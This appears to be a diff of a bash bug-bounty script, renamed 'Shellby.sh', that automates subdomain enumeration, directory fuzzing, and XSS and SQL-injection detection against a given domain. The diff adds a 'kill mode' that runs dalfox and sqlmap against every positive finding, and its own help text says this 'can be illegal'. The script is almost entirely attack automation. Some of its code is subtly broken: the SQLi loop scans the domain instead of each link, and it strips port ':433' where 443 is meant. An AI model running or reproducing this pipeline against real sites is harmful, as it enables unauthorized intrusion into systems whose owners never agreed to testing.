@@ -1,8 +1,5 @@
 #!/bin/bash
 
-### RECON SCRIPT MODIFIED AND ADOPTED FROM ECHOPWN SO I WILL KEEP THE CREDIT HERE
-
-
 
 echo "
 
@@ -37,17 +34,17 @@ help(){
 Usage: ./Scan.sh [options] -d domain.com
 Options:
     -h            Display this help message.
-    -k            Run Knockpy on the domain.
     -n            Run Nmap on all subdomains found.
     -a            Run Arjun on all subdomains found.
     -p            Run Photon crawler on all subdomains found.
     -b            Run Custom Bruteforcer to find subdoamins.
-
+    -e            Run amass after subfinder
+    -k            Kill mode: Actively exploit all positive results (Can be illegal)
   Target:
     -d            Specify the domain to scan.
 
 Example:
-    ./Scan.sh -d hackerone.com
+    ./Shellby.sh -d hackerone.com -n --killmode
 "
 }
 
@@ -98,14 +95,6 @@ source tokens.txt
 
 echo "Starting our subdomain enumeration force..."
 
-
-if [[ "$*" = *"-k"* ]]
-then
-        echo "Starting KnockPy"
-        mkdir Scan/$d/knock
-        cd Scab/$d/knock; python3 ~/BugBounty/Tools/knockpy/knockpy.py "$d" -j; cd ../../..
-fi
-
 rm -rf Scan/$d/fourth-levels/ Scan/$d/*.txt Scan/$d/results/ Scan/$d/links/ Scan/$d/linkstemp/
 
 
@@ -132,13 +121,16 @@ if [ ! -d "$LT" ]; then
     mkdir $LT
 fi
 
-######### BEGIN ECHOPWN ENUM
+######### Begin Recon on all subdomains
 
 echo "Starting Sublist3r..."
 python3 ~/BugBounty/Tools/Sublist3r/sublist3r.py -d "$d" -o Scan/$d/fromsublister.txt
 
+if [[ "$*" = *"-e"* ]]
+then
 echo "Amass turn..."
 amass enum --passive -d $d -o Scan/$d/fromamass.txt
+fi
 
 echo "Starting subfinder..."
 subfinder -d $d -o Scan/$d/fromsubfinder.txt -v --exclude-sources dnsdumpster
@@ -283,24 +275,10 @@ if [ ! -d $PWD/Scan/$d/dirsearch ]; then
         mkdir Scan/$d/dirsearch
 fi
 
-for i in $(cat Scan/$d/alive.txt | sed 's/https\?:\/\///' | sed 's/http\?:\/\///'); do ffuf -e php,txt,html  -w dirsearch/db/dicc.txt  -u https://$i/FUZZ -o "Scan/$d/dirsearch/$i-results.txt"; done
-
-
-
-
-
-
-
-## EXPLOITATION - Entirely Coded by IsaacTheBrave
-
-
-
-
-
-
+for i in $(cat Scan/$d/alive.txt | sed 's/https\?:\/\///' | sed 's/http\?:\/\///');do ffuf -w  ~/BugBounty/Tools/dirsearch/db/dicc.txt -u https://$i/FUZZ  -timeout 3 -o Scan/$d/dirsearch/$i.txt -of md;done
 #Runs Gospider on all picked up domains to find any links assosciated with them, cleans them up into URL's within our scope and moves them to the next step (EXPLOITATION!)
 echo "Cleaning up URLS"
-cat Scan/$d/dirsearch/* | grep -E '2**|3**|5**' | gf urls | sed 's/:80//g' | sed 's/:433//g'   > Scan/$d/spiderlinks.txt
+cat Scan/$d/dirsearch/* | gf urls | sed 's/:80//g' | sed 's/:433//g'   > Scan/$d/spiderlinks.txt
 cat Scan/$d/alive.txt  >> Scan/$d/spiderlinks.txt
 echo "Running Gospider on domains (Things start taking a while from this point onwards. Be patient.)"
 
@@ -315,7 +293,7 @@ echo "Link crawling is now finished; find results in text file: spiderlinks.txt"
 
 echo "Making neat exploitation links with gf"
 echo "generating links to exploit"
-for patt in $(cat patterns); do gf $patt Scan/$d/spiderlinks.txt | grep $d | qsreplace -a |  sort -u  >>  Scan/$d/linkstemp/$patt-links.txt;done
+for patt in $(cat patterns); do gf $patt Scan/$d/spiderlinks.txt | qsreplace -a |  sort -u  >>  Scan/$d/linkstemp/$patt-links.txt;done
 for patt in $(cat patterns); do cat Scan/$d/linkstemp/$patt-links.txt | gf $patt | qsreplace -a | grep -v js | sort -u | httpx | sort -u > Scan/$d/links/$patt-links.txt;done
 rm -rf Scan/$d/linkstemp/
 
@@ -330,9 +308,43 @@ echo "Running XSS scans on links.."
 
 cat Scan/$d/links/xss-links.txt | kxss | gf urls | sort -u > Scan/$d/links/xss-links-valid.txt
 cat Scan/$d/links/xss-links-valid.txt > Scan/$d/links/xss-links.txt
+rm Scan/$d/links/xss-links-valid.txt
+
+echo "Successfully reflected xss links can be found in Scan/$d/links/xss-links.txt"
+
+echo "Running SQLI scans on links"
+
+for sql in $(cat Scan/$d/links/sqli-links); do python3 ~/BugBounty/Tools/DSSS/dsss.py -u $d >> Scan/$d/links/sqli-links-valid.txt;done
+#python2 ~/BugBounty/Tools/sqli-scanner/sqli-scanner.py -f Scan/$d/links/sqli-links.txt -o Scan/$d/links/sqli-links-valid.txt
+cat Scan/$d/links/sqli-links-valid.txt > Scan/$d/links/sqli-links.txt
+rm Scan/$d/links/sqli-links-valid.txt
+
+#clear
+
+echo "Scan finished, these are the results"
+echo "Find all results in Scan/$d/links/"
+echo""
+echo""
+echo"Possible XSS Vulnerabilities:"
+cat Scan/$d/links/xss-links.txt | wc -l
+echo ""
+echo ""
+echo "Possible SQLI vulnerabilities"
+cat Scan/$d/links/sqli-links.txt | wc -l
+echo ""
+echo ""
+echo "Possible LFI Vulnerabilities"
+cat Scan/$d/links/lfi-links.txt | wc -l
+
+
+if [[ "$*" = *"-k"* ]]
+then
+echo "You have enabled KILLMODE, all positive results will be actively exploited, EXIT NOW IF YOU DON'T HAVE PERMISSION TO DO THIS"
 clear
 echo "dalfox alone"
 cat Scan/$d/links/xss-links.txt | dalfox pipe  >>  Scan/$d/results/xss-results.txt
+
+
 
 #Uses the perfectly crafted SQLMAP to find vulnerabilities in HTTP headers, PHP cookies and the provided input (Overall 10/10 tool)
 echo "Running SQL Injections on links"
@@ -353,3 +365,4 @@ echo "Checking for valid waybackurls"
 #httpx -l waybackurls.txt > spiderlinks.txt
 #echo "Notifying you on slack"
 #curl -X POST -H 'Content-type: application/json' --data '{"text":"Scan finished scanning: '$d'"' $slack_url
+fi
